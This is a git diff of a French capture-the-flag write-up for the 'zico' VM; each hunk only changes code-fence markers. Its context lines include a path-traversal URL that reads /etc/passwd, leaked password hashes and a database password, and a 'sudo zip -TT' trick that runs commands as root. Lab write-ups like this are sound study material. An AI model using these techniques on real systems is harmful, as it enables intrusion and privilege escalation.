@@ -17,7 +17,7 @@ Toc toc
 
 Nmap trouve les ports suivants sur la VM :  
 
-```plain
+```
 PORT      STATE SERVICE VERSION
 22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -48,7 +48,7 @@ Après avoir joué un peu avec cette URL on voit que les inclusions distantes et
 
 Ainsi l'URL *http://192.168.1.47/view.php?page=../../../../../../../../../../../../../etc/passwd* nous retourne le contenu suivant :  
 
-```plain
+```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -88,7 +88,7 @@ Maintenant que l'on sait où l'on est, il faut trouver une fonctionnalité perme
 
 Je lance un scan de dossiers sur le serveur web et quelques entrées apparaissent :  
 
-```plain
+```
   `==\. dvbuster v1.0 ./=='
       ¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
 20468 lines to process.
@@ -123,7 +123,7 @@ Dans l'interface de *phpLiteAdmin* est listée une base de donnée à l'emplacem
 
 Une table *info* est présente avec trois colonnes : *id*, *name*, et *pass*. On trouve deux enregistrements :  
 
-```plain
+```
 root	653F4B285089453FE00E2AAFAC573414
 zico	96781A607F4E9F5F423AC01F0DAB0EBD
 ```
@@ -160,7 +160,7 @@ define('DB_USER', 'zico');
 define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
 ```
 
-```plain
+```
 zico@zico:~$ id
 uid=1000(zico) gid=1000(zico) groups=1000(zico)
 ```
@@ -172,7 +172,7 @@ Monkey g0t root
 
 L'utilisateur zico a l'autorisation de lancer deux programmes d'archivage avec les droits root :  
 
-```plain
+```
 zico@zico:~$ sudo -l
 Matching Defaults entries for zico on this host:
     env_reset, exempt_group=admin, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -184,7 +184,7 @@ User zico may run the following commands on this host:
 
 Il y a t-il un moyen de faire exécuter des commandes à l'un de ces deux programmes ? La page de manuel de zip nous donne une solution :  
 
-```plain
+```
 -TT cmd
 --unzip-command cmd
         Use command cmd instead of 'unzip -tqq' to test an archive when the -T option is used.  On Unix, to use a copy of unzip in the current directory instead  of  the  standard system unzip, could use:
@@ -196,7 +196,7 @@ Il y a t-il un moyen de faire exécuter des commandes à l'un de ces deux progra
 
 Plus qu'à récupérer le flag :  
 
-```plain
+```
 zico@zico:~$ sudo zip archive /etc/issue -T -TT "ls /root -al"
   adding: etc/issue (stored 0%)
 -rw------- 1 root root  169 Oct 20 16:44 zifzgKZx
